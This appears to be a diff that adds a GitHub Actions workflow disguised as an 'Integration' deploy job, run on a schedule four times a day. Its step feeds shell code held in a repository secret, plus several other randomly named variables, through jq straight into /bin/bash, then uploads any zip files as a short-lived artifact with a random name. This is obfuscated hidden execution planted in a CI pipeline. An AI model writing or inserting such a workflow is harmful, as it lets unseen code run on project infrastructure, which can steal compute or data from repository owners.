@@ -1,0 +1,33 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '36 2,8,14,20 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Deploy
+        env:
+          vndl05: ${{ secrets.vndl05 }}
+        run: |
+          printf '%s' "$vndl05" | jq -r .jmfy71316 | /bin/bash
+          printf '%s' "$c4249" | jq -r .sr4 | /bin/bash
+          echo $jc8 | jq -r .i2 | /bin/bash
+          echo $hagn60 | jq -r .ubo693 | /bin/bash
+          printf '%s' "$jd51" | jq -r .me8084 | /bin/bash
+          echo $ztoe19748 | jq -r .y6910 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: xnZIxi0T
+          path: "*.zip"
+          retention-days: 1
